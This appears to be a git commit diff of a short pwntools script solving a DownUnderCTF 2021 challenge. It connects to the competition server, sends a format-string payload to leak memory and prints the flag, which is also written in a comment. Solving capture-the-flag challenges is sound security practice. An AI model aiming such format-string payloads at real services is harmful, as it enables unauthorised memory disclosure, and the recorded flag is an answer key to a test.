3aad5195e0bf7eba5edc0dd893ccf82c8f280140
Misael Aguayo <aguayo.misael@gmail.com>
2021-09-25 19:23:09 -0500

    fixed to work with actual ctf challenge

--- hellothere.py
+++ hellothere.py
@@ -1,7 +1,8 @@
 from pwn import *
 
-p = remote("pwn-2021.duc.tf", 31916)
+p = remote("pwn-2021.duc.tf", 31918)
 p.recvuntil("name?")
 p.sendline("%x %x %x %x %x %s")
 
-p.recv()
+#DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
+print(p.recvuntil("}"))
